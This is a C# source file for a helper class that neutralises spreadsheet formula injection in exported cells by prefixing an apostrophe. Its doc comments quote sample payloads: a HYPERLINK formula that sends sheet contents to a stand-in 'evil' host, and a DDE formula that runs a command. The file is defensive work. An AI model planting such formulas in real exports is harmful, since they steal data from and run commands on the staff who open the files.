namespace BuildingBlocks.Spreadsheet;

/// <summary>
/// Neutralises spreadsheet formula injection (CWE-1236) on the way OUT of the system.
///
/// The attack: a customer types <c>=HYPERLINK("http://evil/?d="&amp;A1,"Nhấp vào đây")</c> into a
/// product review or a supplier name. It is stored harmlessly, but the moment a staff member exports
/// the list and opens it, the spreadsheet evaluates it - exfiltrating the sheet, or with
/// <c>=cmd|'/c calc'!A0</c> (DDE) running a command. The victim is the shop's own staff, and nothing
/// in the request that stored the text looked malicious.
///
/// The mitigation is a leading apostrophe, which Excel, LibreOffice and Google Sheets all read as
/// "the rest of this cell is literal text" and do not display. It is applied on WRITE, not on save,
/// so it also protects the CSV path, where the cell's text is all that survives.
/// </summary>
public static class ExcelSafeText
{
    /// <summary>
    /// The four characters a spreadsheet treats as "a formula starts here".
    /// <c>-</c> and <c>+</c> are included because <c>-2+3+cmd|...</c> is a valid formula too.
    /// </summary>
    private static readonly char[] FormulaStarters = { '=', '+', '-', '@' };

    /// <summary>
    /// Tab and carriage return are stripped first: some spreadsheet readers skip leading whitespace
    /// before deciding whether a cell is a formula, so <c>"\t=cmd|..."</c> would slip past a naive
    /// first-character check.
    /// </summary>
    public static string? Neutralize(string? text)
    {
        if (string.IsNullOrEmpty(text)) return text;

        var cleaned = text.TrimStart('\t', '\r', '\n', ' ');
        if (cleaned.Length == 0) return text;

        return Array.IndexOf(FormulaStarters, cleaned[0]) >= 0
            ? "'" + cleaned
            : text;
    }

    /// <summary>True when <paramref name="text"/> would be evaluated as a formula if written raw.</summary>
    public static bool IsDangerous(string? text)
    {
        if (string.IsNullOrEmpty(text)) return false;
        var cleaned = text.TrimStart('\t', '\r', '\n', ' ');
        return cleaned.Length > 0 && Array.IndexOf(FormulaStarters, cleaned[0]) >= 0;
    }
}
